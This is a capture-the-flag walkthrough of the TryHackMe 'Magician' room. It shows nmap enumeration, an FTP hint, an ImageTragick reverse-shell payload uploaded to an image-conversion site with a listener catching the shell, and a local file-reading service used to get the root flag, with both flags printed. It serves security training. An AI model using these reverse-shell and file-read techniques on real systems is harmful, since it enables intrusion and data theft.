
# Magician
This magical website lets you convert image file formats

![magician](./magician.png)

[Magician](https://tryhackme.com/room/magician)


## 💢 We will cover  the topics

- Network Enumeration
- Web Exploitation
- FTP Services
- EOP
- Image Manipulation
- Cryptography

# Task 1 Find the flags! 


Install tools used in this room on Arch Linux:

```
$ sudo pacman -S nmap payloadsallthethings ruby-ctf-party pwncat
```

## Network enumeration

Port and service scan with nmap:

```plaintext
# Nmap 7.91 scan initiated Tue Feb 23 20:19:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.2.188
Nmap scan report for magician (10.10.2.188)
Host is up (0.033s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Tue, 23 Feb 2021 19:20:28 GMT
|     Connection: close
|     {"timestamp":"2021-02-23T19:20:29.162+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   HTTPOptions:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Tue, 23 Feb 2021 19:20:27 GMT
|     Connection: close
|     {"timestamp":"2021-02-23T19:20:24.427+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Tue, 23 Feb 2021 19:20:28 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|     HTTP Version Not Supported</h1></body></html>
|   Socks5:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 23 Feb 2021 19:20:28 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Site doesn't have a title (application/json).
8081/tcp open  http       nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: magician
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=2/23%Time=6035557C%P=x86_64-unknown-linux-gnu
SF:%r(HTTPOptions,13B,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\nVary:\x2
SF:0Access-Control-Request-Method\r\nVary:\x20Access-Control-Request-Heade
SF:rs\r\nContent-Type:\x20application/json\r\nDate:\x20Tue,\x2023\x20Feb\x
SF:202021\x2019:20:27\x20GMT\r\nConnection:\x20close\r\n\r\n{\"timestamp\"
SF::\"2021-02-23T19:20:24\.427\+0000\",\"status\":404,\"error\":\"Not\x20F
SF:ound\",\"message\":\"No\x20message\x20available\",\"path\":\"/\"}")%r(R
SF:TSPRequest,259,"HTTP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20465\r\nDate:
SF:\x20Tue,\x2023\x20Feb\x202021\x2019:20:28\x20GMT\r\n\r\n<!doctype\x20ht
SF:ml><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\
SF:x93\x20HTTP\x20Version\x20Not\x20Supported</title><style\x20type=\"text
SF:/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20
SF:h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size
SF::22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{
SF:font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgr
SF:ound-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status
SF:\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supported</h1></bo
SF:dy></html>")%r(FourOhFourRequest,15E,"HTTP/1\.1\x20404\x20\r\nVary:\x20
SF:Origin\r\nVary:\x20Access-Control-Request-Method\r\nVary:\x20Access-Con
SF:trol-Request-Headers\r\nContent-Type:\x20application/json\r\nDate:\x20T
SF:ue,\x2023\x20Feb\x202021\x2019:20:28\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n{\"timestamp\":\"2021-02-23T19:20:29\.162\+0000\",\"status\":404,\"
SF:error\":\"Not\x20Found\",\"message\":\"No\x20message\x20available\",\"p
SF:ath\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak\"}")%r(Socks5,24E,"HTTP/1
SF:\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-L
SF:anguage:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2023\x20Feb\
SF:x202021\x2019:20:28\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20
SF:html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x8
SF:0\x93\x20Bad\x20Request</title><style\x20type=\"text/css\">body\x20{fon
SF:t-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:
SF:white;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{f
SF:ont-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x2
SF:0a\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;
SF:border:none;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80
SF:\x93\x20Bad\x20Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 23 20:20:52 2021 -- 1 IP address (1 host up) scanned in 83.04 seconds
```

We have:

- 8081: a web app converting images (PNG to JPG)
- 8080: `WhiteLabel Error Page` which is a default generic Spring Boot error page
- 21: a FTP server

Add an entry in our hosts file:

```plaintext
$ grep magician /etc/hosts
10.10.2.188 magician
```

## FTP discovery

NSE script found nothing about the FTP server (no anonymous connection) but
trying manually on the CLI we get a quite different result:

```plaintext
$ ftp 10.10.2.188
Connected to 10.10.2.188.
220 THE MAGIC DOOR
Name (10.10.2.188:cyfun): anonymous
331 Please specify the password.
Password:
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```

NSE script must have timeout due to `delay_successful_login`.

We have access denied on FTP, it was just to give us a hint: imagetragick.

Honestly it doesn't helped since the named of the box is `magician` and the
app is about image conversion I know it was about exploiting
an [ImageMagick][1] vulnerability.

## Web discovery

Uploading PNG at http://10.10.2.188:8081/ doesn't work, but at http://magician:8081/
it works as told in the box intro.

## Web exploitation

As we already know we should exploit imagetragick, let's get to it directly,
copying the payload and replacing the placeholder with our IP and port.

```plaintext
$ cp /usr/share/payloadsallthethings/Upload\ Insecure\ Files/Picture\ Image\ Magik/imagetragik1_payload_imageover_reverse_shell_devtcp.jpg .
$ sed -i 's/ip/10.9.19.77/' imagetragik1_payload_imageover_reverse_shell_devtcp.jpg
$ sed -i 's/80/9999/' imagetragik1_payload_imageover_reverse_shell_devtcp.jpg
```

The vuln is triggered right after upload completion.

```plaintext
$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.2.188:33672 (family 2/IPv4, TCP)
sh: cannot set terminal process group (978): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
uid=1000(magician) gid=1000(magician) groups=1000(magician)
sh-4.4$ pwd
/tmp/hsperfdata_magician
sh-4.4$ ls /home
magician
sh-4.4$ cd
sh-4.4$ pwd
/home/magician
sh-4.4$ cat user.txt
THM{edited}
```

user flag: {% spoiler `THM{simsalabim_hex_hex}` %}

## Elevation of privilege (EoP): from magician to root

A hint was left to us:

```plaintext
sh-4.4$ cat the_magic_continues
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

There must be a local service.

```plaintext
sh-4.4$ ss -nlpt
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128                 0.0.0.0:8081             0.0.0.0:*
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128               127.0.0.1:6666             0.0.0.0:*
LISTEN   0         100                       *:8080                   *:*        users:(("java",pid=915,fd=25))
LISTEN   0         32                        *:21                     *:*
```

There something on port 6666.

Let's see if it's a web app:

```plaintext
sh-4.4$ curl http://127.0.0.1:6666
...
<form action="" method="post" class="form" role="form">
    <div class="form-group ">
        <label class="control-label" for="filename">Enter filename</label>
        <input class="form-control" id="filename" name="filename" type="text" value="">
    </div>
    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
</form>
...
```

We could use some [pivoting techniques][2] but that won't be necessary here as
the case is very simple.

```plaintext
sh-4.4$ curl http://127.0.0.1:6666 -s -X POST --data 'filename=/root/root.txt'
...
<pre class="page-header">
1010100 1001000 1001101 1111011 1101101 1100001 1100111 1101001 1100011 1011111 1101101 1100001 1111001 1011111 1101101 1100001 1101011 1100101 1011111 1101101 1100001 1101110 1111001 1011111 1101101 1100101 1101110 1011111 1101101 1100001 1100100 1111101 1010
</pre>
...
```

Decoding the binary gave nothing, I tried a second type and got a flag
encoded with caesar cipher: `GUZ{zntvp_znl_znxr_znal_zra_znq}`.

I decoded it with [ctf-party][3].

```ruby
ctf_party_console
irb(main):001:0> 'GUZ{zntvp_znl_znxr_znal_zra_znq}'.rot13
=> "THM{edited}"
```

root flag: {% spoiler `THM{magic_may_make_many_men_mad}` %}

